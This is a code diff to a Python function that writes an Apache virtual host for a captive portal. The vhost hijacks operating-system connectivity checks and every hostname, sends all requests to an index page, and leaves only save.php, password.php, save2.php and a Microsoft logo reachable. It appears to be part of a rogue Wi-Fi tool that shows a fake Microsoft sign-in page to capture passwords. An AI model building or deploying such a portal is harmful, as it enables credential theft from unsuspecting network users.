@@ -261,26 +261,34 @@ def create_vhost_microsoft():
     ServerName captive.portal
     ServerAlias *
     DocumentRoot /var/www/captive
+
     <Directory /var/www/captive>
         AllowOverride All
         Require all granted
+        Options -MultiViews
     </Directory>
     Alias /hotspot-detect.html /var/www/captive/index.html
-    Alias /generate_204       /var/www/captive/index.html 
+    Alias /generate_204       /var/www/captive/index.html
     Alias /connecttest.txt    /var/www/captive/index.html
 
     RewriteEngine On
-    RewriteCond %{REQUEST_URI} !^/(save\.php|password\.php|save2\.php)$
-    RewriteCond %{REQUEST_URI} !\.(?:css|js|png|jpg|svg|ico|woff2?)$ [NC]
-    RewriteRule ^ /index.html [L]
+    RewriteCond %{REQUEST_URI} !^/(hotspot-detect\.html|generate_204|connecttest\.txt)$
+
+    RewriteRule ^(save\.php|password\.php|save2\.php|microsoft\.svg)$ - [L]
+
     RewriteCond %{REQUEST_FILENAME} !-f
     RewriteCond %{REQUEST_FILENAME} !-d
+
     RewriteRule ^ /index.html [L]
+
+
     Header always set Cache-Control "no-store, no-cache, must-revalidate, max-age=0"
     Header always set Pragma "no-cache"
     Header always set Expires "0"
+
     AddType image/svg+xml .svg .svgz
 </VirtualHost>
+
 """
     try:
         with open(vhost_file, "w") as f:
